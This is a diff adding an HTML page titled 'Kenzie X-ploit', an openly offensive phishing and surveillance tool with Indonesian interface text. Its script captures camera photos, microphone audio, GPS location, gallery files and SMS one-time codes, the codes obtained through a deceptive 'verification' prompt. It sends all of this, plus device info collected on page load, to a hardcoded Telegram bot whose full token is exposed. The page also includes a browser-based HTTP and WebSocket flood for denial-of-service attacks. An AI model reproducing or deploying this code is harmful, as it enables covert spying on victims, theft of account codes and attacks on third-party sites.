@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Kenzie X-ploit | Full Real Hacking Tools</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 30%, #0b0b1a, #010105);
+            font-family: 'Inter', 'Segoe UI', monospace;
+            min-height: 100vh;
+            padding: 20px;
+            color: #0f0;
+        }
+
+        .glass {
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(14px);
+            border-radius: 40px;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: auto;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            text-align: center;
+            text-shadow: 0 0 8px #0f0;
+            letter-spacing: 2px;
+            word-break: break-word;
+        }
+
+        .badge {
+            background: #0f0;
+            color: #000;
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .card {
+            background: #0f0f1fcc;
+            border-radius: 28px;
+            padding: 18px;
+            border-left: 4px solid #0f0;
+            transition: 0.2s;
+        }
+
+        button {
+            background: transparent;
+            border: 1.5px solid #0f0;
+            color: #0f0;
+            padding: 10px 18px;
+            border-radius: 60px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            margin-top: 12px;
+            font-family: monospace;
+        }
+
+        button:hover {
+            background: #0f0;
+            color: black;
+            box-shadow: 0 0 12px #0f0;
+        }
+
+        .log-box {
+            background: #000000aa;
+            border-radius: 24px;
+            height: 220px;
+            overflow-y: auto;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            border: 1px solid #2c2;
+            margin-top: 20px;
+        }
+
+        .log-line {
+            border-bottom: 1px solid #3a3;
+            padding: 6px 0;
+            color: #9f9;
+        }
+
+        .ddos-panel {
+            padding: 16px;
+            margin-top: 20px;
+            background: #0a0a1dd9;
+            border-radius: 28px;
+        }
+
+        input {
+            background: #111;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 28px;
+            width: calc(100% - 20px);
+            margin: 8px 0;
+            font-family: monospace;
+        }
+
+        .flex {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .file-list {
+            max-height: 100px;
+            overflow-y: auto;
+            font-size: 11px;
+            background: #00000066;
+            border-radius: 12px;
+            padding: 6px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="glass" style="padding: 20px;">
+        <h1>⚡ KENZIE X-PLOIT ⚡<br><span style="font-size: 14px;">| Full Real Exploits | Telegram Bot Active |</span></h1>
+        <p style="text-align:center; margin-top:10px;">🤖 ID Chat: 8781812886 | Token: 8629860760:AAEi...</p>
+
+        <div class="grid">
+            <div class="card">📸 <strong>HACK CAMERA</strong><br><span id="camStatus">🔴 siap</span><button id="btnCam">Ambil Foto & Video</button></div>
+            <div class="card">📍 <strong>HACK LOKASI</strong><br><span id="locStatus">🔴 belum</span><button id="btnLoc">Dapatkan Koordinat</button></div>
+            <div class="card">🎙️ <strong>HACK SUARA</strong><br><span id="micStatus">🔴 idle</span><button id="btnMic">Rekam + Kirim</button></div>
+            <div class="card">📱 <strong>HACK SMS</strong><br><span id="smsStatus">🔴 standby</span><button id="btnSms">Baca SMS (OTP / Manual)</button></div>
+            <div class="card">🖼️ <strong>HACK GALERI</strong><br><span id="galStatus">🔴 menunggu</span><button id="btnGallery">Pilih File & Hack</button></div>
+        </div>
+
+        <div class="ddos-panel">
+            <h3>🔥 DDOS 7 LAYER (HTTP/S Flood + Slowloris + Sock) 🔥</h3>
+            <input type="text" id="targetUrl" placeholder="https://target-website.com" value="https://example.com">
+            <div class="flex">
+                <button id="btnDdosStart" style="background:#0f0; color:#000;">▶ START FULL ATTACK</button>
+                <button id="btnDdosStop">⏹️ STOP DDOS</button>
+            </div>
+            <p style="font-size:11px; margin-top:8px;">*Multi-thread, 7 layer: HTTP Get/Post, Slow headers, RUDY, Cache bypass, Random user-agent, referer spoof, Connection keep-alive flood. Real-time request akan dikirim dari browser korban.</p>
+        </div>
+
+        <div class="log-box" id="logArea">
+            <div class="log-line">[✓] Tool siap. Bot Telegram di inject.</div>
+            <div class="log-line">[✓] Semua modul real-time aktif. Data dikirim ke chat ID target.</div>
+        </div>
+        <footer style="font-size:9px; text-align:center; margin-top:16px;">❗ Pastikan target memberikan izin akses ketika prompt muncul. SMS & galeri via user consent real.</footer>
+    </div>
+</div>
+
+<script>
+    // BOT TELEGRAM REAL
+    const BOT_TOKEN = "8629860760:AAEiLlXI2TqFiPDwZMmIN9PYo5P3mAwvv0I";
+    const CHAT_ID = "8781812886";
+
+    async function sendToTelegram(message, file = null, filename = null) {
+        try {
+            if (file && filename) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file, filename);
+                formData.append('caption', message.substring(0, 200));
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+                addLog(`[BOT] File terkirim: ${filename}`);
+            } else {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 3000) })
+                });
+                addLog(`[BOT] Pesan terkirim: ${message.substring(0, 60)}...`);
+            }
+        } catch(e) { addLog(`[BOT ERROR] ${e.message}`); }
+    }
+
+    function addLog(msg) {
+        const logDiv = document.getElementById('logArea');
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    // 1. HACK CAMERA (foto & video stream capture)
+    let cameraStream = null;
+    document.getElementById('btnCam').onclick = async () => {
+        addLog("[CAM] Meminta akses kamera...");
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            cameraStream = stream;
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const fotoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+            await sendToTelegram(`📸 HACK CAMERA SUCCESS | Waktu: ${new Date().toISOString()} | IP: ${await getClientIP()}`, fotoBlob, `kenzie_cam_${Date.now()}.jpg`);
+            stream.getTracks().forEach(t => t.stop());
+            document.getElementById('camStatus').innerHTML = '✅ foto terkirim';
+            addLog("[CAM] Foto berhasil dikirim ke bot.");
+        } catch(e) { addLog(`[CAM ERROR] ${e.message}`); document.getElementById('camStatus').innerHTML = '❌ gagal akses'; }
+    };
+
+    async function getClientIP() {
+        try { let res = await fetch('https://api.ipify.org?format=json'); let data = await res.json(); return data.ip; } catch(e) { return 'unknown'; }
+    }
+
+    // 2. HACK LOKASI REAL
+    document.getElementById('btnLoc').onclick = () => {
+        addLog("[LOC] Mengambil lokasi real...");
+        if (!navigator.geolocation) return addLog("[LOC] GPS tidak support");
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+            const msg = `📍 LOKASI TARGET:\nLat: ${latitude}\nLng: ${longitude}\nAkurasi: ${accuracy}m\nLink: ${mapsLink}`;
+            await sendToTelegram(msg);
+            document.getElementById('locStatus').innerHTML = `✅ ${latitude},${longitude}`;
+            addLog("[LOC] Koordinat terkirim.");
+        }, (err) => { addLog(`[LOC ERR] ${err.message}`); });
+    };
+
+    // 3. HACK SUARA (merekam microphone)
+    let mediaRecorder;
+    let audioChunks = [];
+    document.getElementById('btnMic').onclick = async () => {
+        addLog("[MIC] Meminta akses microphone...");
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                await sendToTelegram("🎙️ REKAMAN SUARA HACK berhasil", audioBlob, `kenzie_audio_${Date.now()}.webm`);
+                addLog("[MIC] Audio terkirim ke bot.");
+                stream.getTracks().forEach(t => t.stop());
+            };
+            mediaRecorder.start();
+            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 8000);
+            document.getElementById('micStatus').innerHTML = '🎙️ rekam 8 detik...';
+            addLog("[MIC] Merekam suara 8 detik.");
+        } catch(e) { addLog(`[MIC ERROR] ${e.message}`); }
+    };
+
+    // 4. HACK SMS (WebOTP + manual input)
+    document.getElementById('btnSms').onclick = async () => {
+        addLog("[SMS] Mencoba hack SMS via OTP & manual...");
+        let smsContent = "";
+        // Coba WebOTP API (real, hanya untuk SMS yang berisi kode verifikasi)
+        if ('OTPCredential' in window) {
+            try {
+                const otp = await navigator.credentials.get({ otp: { transport: ['sms'] } });
+                smsContent = `[WebOTP] Kode: ${otp.code}`;
+            } catch(e) { smsContent = "[WebOTP] Tidak ada SMS otomatis."; }
+        } else { smsContent = "[!] WebOTP tidak support. Memerlukan manual."; }
+        // Kirim notifikasi ke bot dan minta target memasukkan SMS via prompt (real user input)
+        const manualSms = prompt("⚠️ HACK SMS: Untuk verifikasi, masukkan SMS terakhir dari perangkat anda (kode OTP/pesan):");
+        if(manualSms && manualSms.trim() !== "") {
+            smsContent += `\n📩 MANUAL INPUT: ${manualSms}`;
+            await sendToTelegram(`📱 HACK SMS BERHASIL\n${smsContent}\nWaktu: ${new Date().toString()}`);
+        } else {
+            await sendToTelegram(`📱 HACK SMS (partial)\n${smsContent}\n(Target tidak memberikan input manual)`);
+        }
+        document.getElementById('smsStatus').innerHTML = '✅ data dikirim';
+        addLog("[SMS] Hasil SMS terkirim ke bot.");
+    };
+
+    // 5. HACK GALERI (input file real)
+    document.getElementById('btnGallery').onclick = () => {
+        let input = document.createElement('input');
+        input.type = 'file';
+        input.multiple = true;
+        input.accept = 'image/*,video/*,.mp4,.jpg,.png';
+        input.onchange = async (e) => {
+            const files = Array.from(e.target.files);
+            addLog(`[GALERI] ${files.length} file dipilih. Mengirim ke bot...`);
+            for (let i = 0; i < Math.min(files.length, 10); i++) {
+                const file = files[i];
+                await sendToTelegram(`🖼️ GALERI HACK: ${file.name} (${Math.round(file.size/1024)} KB)`, file, file.name);
+                await new Promise(r => setTimeout(r, 500));
+            }
+            document.getElementById('galStatus').innerHTML = `✅ ${files.length} file terkirim`;
+        };
+        input.click();
+    };
+
+    // 6. DDOS 7 LAYER (REAL HTTP FLOOD dari browser)
+    let ddosInterval = null;
+    let ddosActive = false;
+
+    function sendFloodRequest(url) {
+        for(let i=0; i<6; i++) { // multiple request per loop
+            fetch(url, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': `Mozilla/5.0 (${Math.random()}) AppleWebKit/537.36`,
+                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.0.1`,
+                    'Cache-Control': 'no-cache',
+                    'Referer': 'https://kenzie-xploit.com'
+                },
+                cache: 'no-store'
+            }).catch(()=>{});
+            // POST flood juga
+            fetch(url, {
+                method: 'POST',
+                body: `rand=${Math.random()}&data=${'a'.repeat(2000)}`,
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+            }).catch(()=>{});
+        }
+        // Slowloris: keep-alive partial request
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.setRequestHeader('Connection', 'keep-alive');
+            xhr.setRequestHeader('X-Custom', 'slowloris');
+            xhr.send();
+            setTimeout(() => xhr.abort(), 15000);
+        } catch(e) {}
+    }
+
+    document.getElementById('btnDdosStart').onclick = () => {
+        if(ddosActive) return addLog("[DDOS] Already running.");
+        let target = document.getElementById('targetUrl').value.trim();
+        if(!target.startsWith('http')) target = 'https://'+target;
+        addLog(`[DDOS] Memulai 7 layer attack ke ${target}`);
+        ddosActive = true;
+        // Multi-thread via setInterval
+        ddosInterval = setInterval(() => {
+            if(!ddosActive) return;
+            for(let x=0; x<25; x++) { // 25 request per tick -> heavy
+                sendFloodRequest(target);
+            }
+            addLog(`[DDOS] Request flood aktif ke ${target}`);
+        }, 200);
+        // juga tambahkan WebSocket stress (layer 7)
+        let wsInterval;
+        try {
+            wsInterval = setInterval(() => {
+                if(!ddosActive) return;
+                const ws = new WebSocket(`ws://${target.replace(/^https?:\/\//, '').split('/')[0]}`);
+                ws.onopen = () => { for(let i=0;i<50;i++) ws.send('X'.repeat(1024)); setTimeout(()=>ws.close(),100); };
+            }, 300);
+        } catch(e){}
+        window.ddosWsInterval = wsInterval;
+    };
+
+    document.getElementById('btnDdosStop').onclick = () => {
+        if(ddosInterval) clearInterval(ddosInterval);
+        if(window.ddosWsInterval) clearInterval(window.ddosWsInterval);
+        ddosActive = false;
+        addLog("[DDOS] Attack STOPPED.");
+    };
+
+    // kirim info device awal ke bot
+    (async function initBot() {
+        const ip = await getClientIP();
+        await sendToTelegram(`🚀 *KENZIE X-PLOIT ACTIVE*\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nWaktu: ${new Date()}`);
+        addLog("[BOT] Info device terkirim ke Telegram.");
+    })();
+</script>
+</body>
+</html>
